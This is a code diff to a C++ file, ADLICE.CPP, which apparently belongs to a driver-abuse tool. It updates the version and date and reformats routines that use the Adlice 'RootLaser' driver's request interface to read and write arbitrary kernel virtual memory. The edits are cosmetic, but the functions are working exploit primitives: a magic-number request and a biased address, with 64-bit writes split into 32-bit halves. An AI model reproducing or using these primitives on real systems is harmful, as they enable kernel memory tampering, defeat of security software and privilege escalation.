@@ -4,9 +4,9 @@
 *
 *  TITLE:       ADLICE.CPP
 *
-*  VERSION:     1.31
+*  VERSION:     1.50
 *
-*  DATE:        19 Sep 2026
+*  DATE:        22 Sep 2026
 *
 *  Adlice driver routines.
 *
@@ -20,20 +20,25 @@
 #include "global.h"
 #include "idrv/adlice.h"
 
+/*
+* RLaserWriteMemoryPrimitive
+*
+* Purpose:
+*
+* RootLaser write ULONG64 primitive.
+*
+*/
 BOOL RLaserWriteMemoryPrimitive(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
-    _In_ ULONG Value)
+    _In_ ULONG Value
+)
 {
     RLASER_WRITE_REQUEST request;
 
     RtlSecureZeroMemory(&request, sizeof(request));
     request.MagicNumber = RLASER_MAGIC;
-    request.Padding1 = 0;
-
     request.BaseAddress = (DWORD64)Address - RLASER_WRITE_BIAS;
-    request.Index = 0;
-    request.Padding2 = 0;
     request.ValueToWrite = (DWORD64)Value;
 
     return supCallDriver(
@@ -57,10 +62,11 @@ BOOL RLaserReadKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes)
+    _In_ ULONG NumberOfBytes
+)
 {
-    DWORD size = sizeof(RLASER_READ_REQUEST) + NumberOfBytes;
     BOOL bResult = FALSE;
+    DWORD size = sizeof(RLASER_READ_REQUEST) + NumberOfBytes;
     PRLASER_READ_REQUEST pRequest;
 
     pRequest = (PRLASER_READ_REQUEST)supAllocateLockedMemory(size,
@@ -104,16 +110,16 @@ BOOL RLaserWriteKernelVirtualMemory(
     _In_ ULONG NumberOfBytes
 )
 {
+    ULONG bytesRemaining = NumberOfBytes;
     ULONG_PTR currentAddress = Address;
     BYTE* dataPtr = (BYTE*)Buffer;
-    ULONG bytesRemaining = NumberOfBytes;
     DWORD64 value;
 
     while (bytesRemaining > 0) {
 
         value = 0;
-        if (bytesRemaining >= 8)
-        {
+        if (bytesRemaining >= sizeof(ULONG64)) {
+
             RtlCopyMemory(&value, dataPtr, sizeof(ULONG64));
 
             // lower bytes
@@ -135,7 +141,7 @@ BOOL RLaserWriteKernelVirtualMemory(
 
             RtlCopyMemory(&value, dataPtr, bytesRemaining);
 
-            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress, (ULONG)(value & 0xFFFFFFFF)))
+            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress, (ULONG)(value & 0xFFFFFFFFUL)))
                 return FALSE;
 
             if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress + sizeof(ULONG), (ULONG)(value >> 32)))
